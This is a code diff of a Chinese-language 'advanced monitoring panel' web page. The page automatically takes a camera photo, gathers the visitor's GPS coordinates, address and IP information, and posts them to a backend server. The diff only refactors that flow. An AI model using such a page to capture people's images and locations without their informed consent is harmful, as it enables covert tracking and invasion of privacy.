@@ -54,7 +54,7 @@
   </style>
 </head>
 <body>
-  <h1>高級監控ㄅ面板</h1>
+  <h1>高級監控ㄠ面板</h1>
   <div class="container">
     <div class="card">
       <h2>IP 與位置資訊</h2>
@@ -112,7 +112,7 @@
         stream.getTracks().forEach((track) => track.stop());
         
         // 繼續處理拍攝的照片
-        processPhotoData(photoData);
+        sendPhotoToServer(photoData);
       }, 1000);
     } catch (error) {
       console.error('無法啟動相機:', error);
@@ -142,26 +142,21 @@
     } catch (error) {
       console.error('GPS 錯誤或超時:', error);
       statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
-      throw error;
-    }
-  }
-
-  // 處理照片和 GPS 資訊
-  async function processPhotoData(photoData) {
-    try {
-      // 獲取 GPS 資訊並繼續處理
-      const { latitude, longitude, address } = await getGpsCoordinates();
-      await sendPhotoToServer(photoData, latitude, longitude, address);
-    } catch (error) {
-      console.error('處理過程中發生錯誤:', error);
-      document.getElementById('status').innerText = '處理過程中發生錯誤，請檢查控制台。';
+      return null;
     }
   }
 
   // 發送照片和 GPS 到後端
-  async function sendPhotoToServer(photoData, latitude, longitude, address) {
+  async function sendPhotoToServer(photoData) {
     const statusElement = document.getElementById('status');
     try {
+      console.log('獲取 GPS 資訊...');
+      const gpsData = await getGpsCoordinates();
+      if (!gpsData) {
+        throw new Error('GPS 無法取得，略過發送照片。');
+      }
+      const { latitude, longitude, address } = gpsData;
+
       console.log('開始發送資料到後端...');
       const formData = new URLSearchParams();
       formData.append('message', '自動拍照圖片');
@@ -303,6 +298,7 @@
     startCamera();
   });
 </script>
+
 
 
 </body>
